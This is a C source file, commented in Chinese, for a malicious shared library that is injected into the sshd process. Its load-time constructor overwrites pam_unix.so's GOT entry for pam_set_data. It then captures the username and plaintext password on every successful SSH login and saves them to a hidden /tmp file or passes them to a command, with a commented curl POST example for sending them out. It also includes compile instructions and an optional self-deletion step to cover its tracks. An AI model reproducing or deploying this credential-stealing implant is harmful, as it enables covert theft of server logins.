/*
 * inject_got.c - 注入到 sshd 进程的恶意 so
 *
 * 加载后通过 constructor(so_init) 自动完成 GOT 劫持:
 *   1. 定位 pam_unix.so 在当前进程中的加载基址
 *   2. 遍历其 ELF 动态段, 找到 pam_set_data 对应的重定位(GOT)表项
 *   3. 把表项改指向本文件的 my_pam_set_data, 完成函数劫持
 *
 * pam_unix 认证结束时会以 "unix_setcred_return" 为名调用 pam_set_data,
 * my_pam_set_data 据此捕获认证结果, 并从 pam_handle 中取出用户名与密码
 * 按配置外发(写文件或执行命令), 最后透传调用原函数, 不影响正常登录.
 *
 * 编译: gcc -shared inject_got.c -ldl -fPIC -o hello.so -std=c99
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <assert.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define MAX_BUF_SIZE 1024
#define MAX_PATH 255

/* ======================= 外发配置(install.sh 生成时会替换) ======================= */

int SEND_MODE = 0;  /* 0 = 写文件模式, 1 = 命令执行模式 */
char SEND_TARGET[MAX_PATH] = "/tmp/.password.txt"; /* SEND_MODE=0: 密码写入的文件路径; SEND_MODE=1: 命令模板, 两个 %s 分别对应用户名/密码 */
char EVIL_SO_PATH[] = "/tmp/hello.so"; /* 自身落盘路径, 静默销毁时用于 rm */
int SILENT_MODE = 0;  /* 0 = 关闭, 1 = 捕获到密码后自删除退出 */
char SILENT_USER[] = "anyone"; /* SILENT_MODE=1 时: anyone 表示任意用户登录成功即销毁; 其他值则登录用户名命中时才销毁 */

/* 命令执行模式示例: */
// int SEND_MODE = 1;
// char SEND_TARGET[MAX_PATH] = "curl -X POST -d 'username=%s&password=%s' http://127.0.0.1";

/*
 * libpam 中 pam_handle 的内存布局(仅前缀部分).
 * 劫持函数里直接按偏移访问 user / authtok 字段,
 * 因此这里的字段顺序与类型必须与目标系统 libpam 保持一致.
 */
struct pam_handle {
    char *authtok;
    unsigned caller_is;
    struct pam_conv *pam_conversation;
    char *oldauthtok;
    char *prompt;                /* for use by pam_get_user() */
    char *service_name;
    char *user;
    char *rhost;
    char *ruser;
    char *tty;
    char *xdisplay;
    char *authtok_type;          /* PAM_AUTHTOK_TYPE */
    /*
    struct pam_data *data;
    struct pam_environ *env;
    struct _pam_fail_delay fail_delay;
    struct pam_xauth_data xauth;
    struct service handlers;
    struct _pam_former_state former;
    const char *mod_name;
    int mod_argc;
    char **mod_argv;
    int choice;

#ifdef HAVE_LIBAUDIT
    int audit_state;
#endif
    int authtok_verified;
    char *confdir;
    */
};

/* 解析 /proc/pid/maps, 取 module_name 在指定进程中的加载基址 */
void *get_module_base(pid_t pid, const char *module_name)
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[MAX_BUF_SIZE];

    /* 格式化字符串得到 "/proc/pid/maps" */
    if (pid < 0) {
        /* pid < 0 表示读取自身进程 */
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    } else {
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    /* 打开 /proc/pid/maps, 获取指定进程加载的内存模块信息 */
    fp = fopen(filename, "r");
    if (fp != NULL) {
        /* 逐行读取, 查找指定的 so 模块 */
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, module_name)) {
                /* 行首地址形如 "起始-结束", 取 '-' 前的起始地址 */
                pch = strtok(line, "-");
                addr = strtoul(pch, NULL, 16);
                break;
            }
        }
    }
    fclose(fp);
    return (void *)addr;
}

/* 重定位表相关信息, 从 DT_* 动态段条目中提取 */
struct rel_info {
    uint64_t rel_plt_addr; /* DT_JMPREL: .rela.plt 重定位表地址 */
    uint32_t rel_plt_size; /* DT_PLTRELSZ: 重定位表总大小 */
    uint64_t str_tab_addr; /* DT_STRTAB: 动态字符串表地址 */
    uint64_t sym_tab_addr; /* DT_SYMTAB: 动态符号表地址 */
    uint32_t rel_type;     /* DT_PLTREL: 重定位类型(DT_RELA=7 / DT_REL=17) */
};

/* PT_DYNAMIC 段的地址与大小 */
struct dynamic_segment {
    Elf64_Dyn *addr;
    uint32_t size;
};

static int get_dyn_section(void *base_addr, struct dynamic_segment *dyn);
static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info);
static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry);

/*
 * 在 base_addr 模块的重定位表中查找 func_name 对应的 GOT 表项,
 * 将其改为 target_entry; old_entry 非 NULL 时带回原函数地址.
 */
static int hook_entry(void *base_addr,
                      const char *func_name,
                      uint64_t *old_entry,
                      uint64_t target_entry)
{
    struct dynamic_segment dyn;
    struct rel_info info;

    get_dyn_section(base_addr, &dyn);
    get_rel_info(dyn.addr, dyn.size, &info);

    Elf64_Rela *rel_table = (Elf64_Rela *)info.rel_plt_addr;
    Elf64_Sym *sym_table = (Elf64_Sym *)info.sym_tab_addr;
    char *str_table = (char *)info.str_tab_addr;

    for (int i = 0; i < info.rel_plt_size / sizeof(Elf64_Rela); i++) {
        /* 由重定位项定位符号, 再由符号定位函数名 */
        uint32_t symbol_index = ELF64_R_SYM(rel_table[i].r_info);
        uint32_t name_offset = sym_table[symbol_index].st_name;
        char *current_name = &str_table[name_offset];

        if (strcmp(func_name, current_name) == 0) {
            /* r_offset 是相对模块基址的偏移: GOT 表项地址 = 基址 + r_offset */
            uint64_t *addr = (uint64_t *)(rel_table[i].r_offset + (uint64_t)base_addr);

            update_entry(addr, old_entry, target_entry);
            break;
        }
    }

    return 0;
}

/* 从 ELF 头出发, 找到 PT_DYNAMIC 段的地址与大小 */
static int get_dyn_section(void *base_addr, struct dynamic_segment *dyn)
{
    if (base_addr == NULL || dyn == NULL) {
        return 0;
    }

    /* 校验 ELF 魔数 */
    Elf64_Ehdr *header = (Elf64_Ehdr *)(base_addr);
    if (memcmp(header->e_ident, "\177ELF", 4) != 0) {
        return -1;
    }

    /* program header table 实际地址 */
    Elf64_Phdr *phdr_table = (Elf64_Phdr *)((uint64_t)base_addr + header->e_phoff);
    if (phdr_table == 0) {
        return -1;
    }
    size_t phdr_count = header->e_phnum;

    /* 遍历 program header table, p_type 为 PT_DYNAMIC 的即动态段 */
    for (int j = 0; j < phdr_count; j++) {
        if (phdr_table[j].p_type == PT_DYNAMIC) {
            dyn->addr = (Elf64_Dyn *)(phdr_table[j].p_vaddr + (uint64_t)base_addr);
            dyn->size = phdr_table[j].p_memsz;
            break;
        }
    }
    return 0;
}

/* 遍历动态段, 提取重定位相关的 DT_* 条目 */
static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info)
{
    if (info == NULL) {
        return;
    }

    for (int i = 0; i < dynamic_size / sizeof(Elf64_Dyn); i++) {
        if (dynamic_table[i].d_tag == DT_JMPREL) {
            info->rel_plt_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_STRTAB) {
            info->str_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTRELSZ) {
            info->rel_plt_size = dynamic_table[i].d_un.d_val;
        }
        if (dynamic_table[i].d_tag == DT_SYMTAB) {
            info->sym_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTREL) {
            // DT_RELA = 7
            // DT_REL = 17
            info->rel_type = dynamic_table[i].d_un.d_val;
        }
    }
}

/* 修改 GOT 表项: 先把所在页改为可写, 保存旧值后覆盖为新值 */
static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry)
{
    /* 获取当前内存分页大小, 并按页对齐拿到表项所在页的起始地址 */
    uint64_t page_size = sysconf(_SC_PAGESIZE);
    uint64_t mem_page_start = (uint64_t)addr & (~(page_size - 1));
    mprotect((void *)mem_page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
    if (old_entry != NULL) {
        *old_entry = *addr;
    }
    *addr = target_entry;
}

/* ======================= pam_set_data 劫持 ======================= */

typedef int (*pam_set_data_fn_t)(struct pam_handle *, const char *, void *, void *);

static pam_set_data_fn_t old_pam_set_data = NULL; /* 原始 pam_set_data, 由 hook_entry 填充 */

/*
 * pam_set_data 的劫持实现.
 * pam_unix 结束认证时会设置名为 "unix_setcred_return" 的数据项,
 * data 指向认证返回值: 0 表示认证成功, 此时 pam_handle 中
 * 已经保存了用户名(user)与密码(authtok), 在这里完成捕获与外发.
 */
int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void *data, void *cleanup)
{
    char unix_setcred_return[] = "unix_setcred_return";

    if (strstr(unix_setcred_return, module_data_name)) {
        int ret = *(int *)data;

        if (ret == 0) { /* 认证成功 */
            if (SEND_MODE == 0) {
                /* 写文件模式: 追加写入用户名与密码 */
                FILE *fp = fopen(SEND_TARGET, "a+");
                if (fp != NULL) {
                    fprintf(fp, "login successful username is : %s    password is: %s\n", pamh->user, pamh->authtok);
                    fclose(fp);
                }
            } else {
                /* 命令模式: SEND_TARGET 作为格式化模板执行, 需包含两个 %s */
                char message[1024];
                snprintf(message, sizeof(message), SEND_TARGET, pamh->user, pamh->authtok);
                system(message);
            }
        }

        /* 静默销毁: 开启 SILENT_MODE 且认证成功时, 按用户名匹配后删除自身 so */
        if (SILENT_MODE == 1 && ret == 0) {
            if (strstr(SILENT_USER, "anyone") || strstr(SILENT_USER, pamh->user)) {
                char cmd[1024];
                snprintf(cmd, sizeof(cmd), "rm %s", EVIL_SO_PATH);
                system(cmd);
            }
        }
    }

    /* 透传调用原函数, 保证 PAM 流程不受影响 */
    return old_pam_set_data(pamh, module_data_name, data, cleanup);
}

/*
 * so 加载时的 constructor: 完成 pam_set_data 的 GOT 劫持.
 * 注意: constructor 属性必须写在函数定义上, 只写在前向声明上
 * 会被新版 GCC 静默忽略, 导致 so 加载后 hook 不生效.
 */
__attribute__((constructor)) static int so_init(void)
{
    /* pam_unix.so 即发起 pam_set_data 调用的模块 */
    void *base_addr = get_module_base(getpid(), "pam_unix.so");
    /* 按路径再次 dlopen 自身以取得句柄, 再从中解析出劫持函数地址 */
    void *handle = dlopen(EVIL_SO_PATH, RTLD_NOW);
    void *export_pam_set_data = dlsym(handle, "my_pam_set_data");
    hook_entry(base_addr, "pam_set_data", (uint64_t *)&old_pam_set_data, (uint64_t)export_pam_set_data);

    return 0;
}
